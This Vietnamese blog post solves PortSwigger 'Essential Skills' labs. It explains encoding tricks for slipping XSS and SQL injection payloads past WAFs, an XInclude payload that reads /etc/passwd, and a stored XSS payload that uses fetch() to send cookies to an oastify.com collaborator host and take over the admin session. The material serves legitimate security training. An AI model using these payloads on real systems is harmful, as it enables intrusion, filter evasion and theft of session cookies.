---
title: "[PortSwigger Lab] - Essential Skills"
description: Solution of Essential Skills Lab
date: 2025-06-20 23:28:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, essential skills]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-20-portswigger-lab-essential-skills/essential-skills.jpg
    alt: Essential Skills
---

## Obfuscating attacks using encodings
--- 
### Context-specific decoding
Cả phía **client** và **server** đều sử dụng nhiều loại mã hóa khác nhau để truyền dữ liệu giữa các hệ thống. Khi cần sử dụng dữ liệu, thông thường họ phải giải mã nó trước. Trình tự giải mã cụ thể sẽ phụ thuộc vào ngữ cảnh dữ liệu đó xuất hiện. Ví dụ:
- Tham số truy vấn (query parameter) thường được giải mã URL ở phía **server**.
- Nội dung văn bản trong một phần tử **HTML** có thể được giải mã **HTML** ở phía **client**.

Khi xây dựng một cuộc tấn công, bạn cần xác định **payload** của mình đang được chèn vào đâu. Nếu có thể suy luận được cách dữ liệu của bạn sẽ được giải mã dựa trên ngữ cảnh đó, bạn có thể tìm ra nhiều cách đại diện khác nhau cho cùng một **payload**.

### Decoding discrepancies
Các cuộc tấn công dạng **injection** thường sử dụng các mẫu dễ nhận biết như:
- Thẻ **HTML**
- Hàm **JavaScript**
- Câu lệnh **SQL**

Vì dữ liệu đầu vào hầu như không bao giờ được kỳ vọng chứa **mã code** do người dùng cung cấp, các trang web thường triển khai các biện pháp bảo vệ để chặn những yêu cầu chứa các mẫu đáng ngờ đó.

Tuy nhiên, các bộ lọc đầu vào này cũng phải giải mã dữ liệu để kiểm tra tính an toàn. Về mặt bảo mật, điều quan trọng là việc giải mã khi kiểm tra đầu vào phải giống hệt với việc giải mã khi dữ liệu được sử dụng thực tế ở phía **server** hoặc **trình duyệt**. Nếu có sự khác biệt, kẻ tấn công có thể lén lút đưa **payload** độc hại vượt qua bộ lọc bằng cách áp dụng các kiểu mã hóa khác nhau mà sau đó sẽ được tự động gỡ bỏ.

### Obfuscation via URL encoding
Trong **URL**, một số ký tự được dành riêng và mang ý nghĩa đặc biệt. Ví dụ:
  - Ký tự `&` được dùng để phân tách các tham số trong **query string**.
Tuy nhiên, có thể người dùng nhập chuỗi như `"Fish & Chips"` vào ô tìm kiếm. Trình duyệt sẽ tự động mã hóa **URL** những ký tự có thể gây hiểu lầm:

```
[...]/?search=Fish+%26+Chips
```
Điều này giúp ký tự `&` không bị hiểu nhầm là phân tách tham số.

> Ký tự khoảng trắng **(space)** có thể được mã hóa thành `%20`, nhưng cũng thường được thay bằng dấu `+`.
{: .prompt-info}

Trên **server**, đầu vào dựa trên **URL** sẽ được tự động giải mã trước khi gán vào các biến. Nghĩa là:
  - `%22` => `"`, `%3C` => `<`, `%3E` => `>`

Do đó, bạn có thể chèn dữ liệu được mã hóa **URL** vào đường dẫn và vẫn được hiểu đúng bởi ứng dụng phía sau.

Một số trường hợp **WAF (Web Application Firewall)** không giải mã đúng dữ liệu để kiểm tra, nên bạn có thể ẩn **payload** bằng cách mã hóa các từ khóa bị chặn. Ví dụ:

```
SELECT => %53%45%4C%45%43%54
```
### Obfuscation via double URL encoding
Một số **server** thực hiện giải mã **URL** hai lần. Nếu các cơ chế bảo mật không làm điều tương tự, bạn có thể giấu **payload** bằng cách mã hóa hai lần.

```
<img src=x onerror=alert(1)>
```
{: file="plain text"}

```
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```
{: file="single encoding"}

```
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```
{: file="double encoding"}

Thì **WAF** chỉ giải mã một lần sẽ không phát hiện được **payload**, trong khi phía **server** lại giải mã tiếp và **payload** sẽ được thực thi.

### Obfuscation via HTML encoding
Trong tài liệu **HTML**, các ký tự đặc biệt cần được **escape/mã hóa** để tránh bị hiểu lầm là **markup**. Ví dụ:
- `:` => `&colon;`
- `:` => `&#58;` **(mã thập phân)**
- `:` => `&#x3a;` **(mã hex)**

Trình duyệt sẽ tự động giải mã các ký tự **HTML** trong nội dung thẻ hoặc thuộc tính khi hiển thị trang.

Nếu bạn đang chèn **payload** vào trong thuộc tính **HTML** như `onerror`, bạn có thể mã hóa một số ký tự để tránh bị phát hiện:

```html
<img src=x onerror="&#x61;lert(1)">
```

Trình duyệt sẽ giải mã `&#x61;` thành `a` và thực thi `alert(1)`.

#### Chèn số 0 phía trước
Khi dùng mã **thập phân** hoặc **hex**, bạn có thể thêm tùy ý số `0` ở đầu, và nhiều **WAF** không xử lý đúng điều này:

```html
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

`&#00000000000058;` trình duyệt sẽ bỏ qua tất cả số `0` ở đầu => `&#58;` vẫn là: `javascript:alert(1)`

### Obfuscation via XML encoding
**XML** cũng hỗ trợ mã hóa ký tự theo cách tương tự như **HTML**. Điều này giúp:
- Có thể ẩn các ký tự đặc biệt trong nội dung phần tử mà không làm hỏng cú pháp **XML**.
- Phù hợp để thử nghiệm **XSS** trong dữ liệu **XML** hoặc tránh **WAF** phát hiện từ khóa **SQL**.

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```
`&#x53;` là chữ `S`, và toàn bộ chuỗi `SELECT * ...` sẽ được giải mã và sử dụng bởi **server** nếu không kiểm soát chặt.

### Obfuscation via unicode escaping
Chuỗi mã hóa **Unicode** có dạng tiền tố `\u` theo sau là 4 chữ số **hex** đại diện cho ký tự.

`\u003a` tương ứng với dấu hai chấm `:`.

**ES6** cũng hỗ trợ cú pháp mới: dùng dấu ngoặc nhọn => `\u{3a}`.

Khi phân tích chuỗi, hầu hết các ngôn ngữ lập trình sẽ giải mã các chuỗi **Unicode** này - bao gồm **engine JavaScript** trong trình duyệt. Vì thế, khi chèn **payload** vào ngữ cảnh chuỗi, có thể làm rối nó bằng **Unicode** tương tự như đã làm với **HTML entity** ở phần trên.

Giả sử khai thác lỗ hổng **DOM XSS**, và đầu vào của được đưa vào hàm `eval()` dưới dạng chuỗi. Nếu cách chèn trực tiếp bị chặn, có thể thử:

```js
eval("\u0061lert(1)")  // "\u0061" là "a" → alert(1)
```
Vì payload vẫn được giữ ở dạng mã hóa ở phía **server**, nó có thể không bị phát hiện, cho đến khi trình duyệt giải mã và thực thi nó.

> Trong chuỗi, có thể **escape** bất kỳ ký tự nào. Nhưng ngoài chuỗi, **escape** một số ký tự (ví dụ: dấu ngoặc) sẽ gây lỗi cú pháp.
{: .prompt-info}

Ngoài ra, cú pháp **Unicode** kiểu **ES6** `(\u{})` cho phép thêm số `0` phía trước, điều này có thể khiến **WAF** bị đánh lừa như với **HTML encoding** trước đó:

```html
<a href="javascript:\u{00000000061}alert(1)">Click me</a>
```

### Obfuscation via hex escaping
Khi chèn vào ngữ cảnh chuỗi, có thể dùng **hex escaping** - đại diện ký tự bằng mã **hex** bắt đầu bằng `\x`.

```js
eval("\x61lert")  // \x61 = "a" → alert()
```

Tương tự **Unicode escape**, chuỗi này được giải mã ở phía **client** nếu được đánh giá như chuỗi **JavaScript**.

Ngoài ra, **SQL injection** cũng có thể được làm rối kiểu này bằng cú pháp `0x`, ví dụ:

```
0x53454c454354  => "SELECT"
```

### Obfuscation via octal escaping
Mã hóa **bát phân** cũng tương tự như **hex**, nhưng dùng **cơ số 8 (octal)**, và được viết với dấu gạch chéo ngược `\` đơn thuần, không có tiền tố `x` hay `u`.

```js
eval("\141lert(1)")  // \141 = "a" → alert(1)
```

### Obfuscation via multiple encodings
Có thể kết hợp nhiều lớp mã hóa để làm **payload** khó phát hiện hơn.

```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```
- `&bsol;` là **HTML entity** của ký tự `\` => Sau khi **HTML decode:** `\u0061lert(1)`
- `\u0061` => `"a"` → trở thành `alert(1)`

> Cần hiểu thứ tự giải mã nào xảy ra trên đầu vào thì mới có thể chèn **payload** thành công.
{: .prompt-info}

### Obfuscation via the SQL CHAR() function
Dù không hoàn toàn là **mã hóa**, có thể ẩn từ khóa **SQL** thông qua hàm `CHAR()` - hàm này nhận mã số **Unicode (thập phân hoặc hex)** và trả về ký tự tương ứng.

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
=> "SELECT"
```

## Using Burp Scanner
---
### Lab: Discovering vulnerabilities quickly with targeted scanning
#### Analysis
- Sử dụng chức năng **check stock**

```http
POST /product/stock HTTP/2
Host: 0aac00b1030a62328099f4870028002a.web-security-academy.net
...
productId=1&storeId=1
```
- Chuột phải vào **request** và **Do active scan**
- Chọn tab **Dashboard** hoặc **All issues** ở dưới cùng để xem các lỗi được tìm thấy
- Quan sát ta thấy một số lỗi **High (đỏ)**, gửi **request** đó đến **Repeater**
- Bôi đên phần **payload** được thêm vào, quan sát **Inspector**, ta thấy **payload** đã được **decode** và có thể sửa

```http
POST /product/stock HTTP/2
Host: 0aac00b1030a62328099f4870028002a.web-security-academy.net
...
productId=%3cgkf%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2f558yjyo4lz7qvnfvxalpuvj1jspldb1cp4cu0j.oastify.com%2ffoo%22%2f%3e%3c%2fgkf%3e&storeId=1
```

**Payload** được **decode**

```
productId=<gkf xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://558yjyo4lz7qvnfvxalpuvj1jspldb1cp4cu0j.oastify.com/foo"/></gkf>&storeId=1
```
**Response** nhận được

```
"Invalid product ID: l6sxypnejgpc0a7g71yzyszjlgigtgkfigz"
```

=> Ứng dụng trả về lỗi, không thể sử dụng **Document Type Definition (DTD)** vì nó phải đứng trước toàn bộ tài liệu **XML**, không được chèn vào giữa hoặc trong giá trị của tham số. ta sử dụng **XInclude** để gọi nội dung từ `/etc/passwd`

#### Exploit
- Bôi đen phần **payload** được thêm vào, đến tab **Inspector** thêm **payload** và **Apply change** nó sẽ tự động **encode** trước khi gửi

```xml
<xi:include parse="text" href="/etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>
```
- Gửi lại **request** 

### Lab: Scanning non-standard data structures
- Login bằng account `wiener`
- Quan sát ta thấy **request** có **cookie** khả nghi

```http
GET /my-account?id=wiener HTTP/2
Host: 0aeb00c104f4826880b0f86c00ab00b1.web-security-academy.net
Cookie: session=wiener%3alZwpRCmLa4IIJabOU2k3hDLPdHoJ29QW
```

- Decode **cookie** ta được 

```
session=wiener:lZwpRCmLa4IIJabOU2k3hDLPdHoJ29QW
```
- Bôi đen `wiener` > chuột phải > **Scan selected insertion point** > **Audit** > **Ok**
- Sau khi xong, nếu chưa có **bug High** nào => **ccan** như trên lần nữa 
- Xuất hiện **XSS (stored)** ở **scan** trước đó
- Gửi **request** đó đến **Repeater**

```http
GET /my-account?id=wiener HTTP/2
Host: 0aeb00c104f4826880b0f86c00ab00b1.web-security-academy.net
Cookie: session='%22%3e%3csvg%2fonload%3dfetch%60%2f%2ftnkm1m6s3npedbxjfy3dcj1p1g7av0js9g06nwbl%5c.oastify.com%60%3e%3alZwpRCmLa4IIJabOU2k3hDLPdHoJ29QW
```
- Decode **cookie** ta được 

```
'"><svg/onload=fetch`//tnkm1m6s3npedbxjfy3dcj1p1g7av0js9g06nwbl\.oastify.com`>:lZwpRCmLa4IIJabOU2k3hDLPdHoJ29QW
```
- Đây là kỹ thuật **Out-of-band(OOB)**, ta sử dụng nó để gửi dữ liệu bên ngoài

#### Exploit
- Bôi đen payload, đến tab **Inspector** thêm **payload** và **Apply change** nó sẽ tự động **encode** trước khi gửi

```
'"><svg/onload=fetch(`//yourburp-colaborator.oastify.com/${encodeURIComponent(document.cookie)}`)>:lZwpRCmLa4IIJabOU2k3hDLPdHoJ29QW
```
- **Burp Collaborator** > **Pool now** để nhận **request** đến
- Quan sát các **request HTTP** > **Request to Collaborator**

```http
GET /session%3Dadministrator%253avfMmmrwrLTU0r2YLvXdBSFpLGzBpjBWi%3B%20secret%3DWb58yzF404gApH4l3tDsh2jGWCQvLAWE%3B%20session%3Dadministrator%253avfMmmrwrLTU0r2YLvXdBSFpLGzBpjBWi HTTP/1.1
Host: mkawxxl3vht8dfszluv0bdidd4jv7qvf.oastify.com
```
- Decode lấy **session** của **administrator** để **login** với vai trò **admin**

```
administrator:vfMmmrwrLTU0r2YLvXdBSFpLGzBpjBWi
```
- Sử dụng **Devtool** hoặc **cookie editor** để thay đổi **cookie** của **site** hiện tại
- Xóa người dùng `carlos`

#### Explain
- **View log** bằng account **admin**
- Ta thấy payload đã được tiêm vào đây

```html
<div>Integrity violation detected from '"&gt;
  <svg onload="fetch(`//mkawxxl3vht8dfszluv0bdidd4jv7qvf.oastify.com/${encodeURIComponent(document.cookie)}`)"></svg>
</div>
```
- Khi **admin** view log => **XSS** kích hoạt gửi dữ liệu đến **Burp Collaborator**

---
Goodluck! 🍀🍀🍀 


